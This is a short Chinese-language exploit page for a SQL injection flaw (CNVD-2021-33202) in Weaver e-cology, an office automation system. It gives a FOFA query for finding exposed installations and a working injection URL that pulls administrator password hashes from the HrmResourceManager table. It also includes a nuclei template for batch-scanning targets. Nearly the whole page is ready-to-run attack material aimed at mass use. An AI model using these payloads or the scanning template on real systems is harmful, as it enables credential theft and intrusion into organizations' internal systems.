## 泛微E-cology-LoginSSO.jsp存在QL注入漏洞(CNVD-2021-33202)

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。

## fofa

```
app="泛微-协同办公OA"
```



## poc

```
/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405241359251.png)



## nuclei批量yaml文件

```
id: ecology-loginSSO-sql-CNVD-2021-33202
info:
  name: Template Name
  author: mhb17
  severity: critical
  description: description
  reference:
    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20LoginSSO.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-33202.html
  tags: ecology,sqli
requests:
  - raw:
      - |
        GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '[0-9A-F]{32}'
```

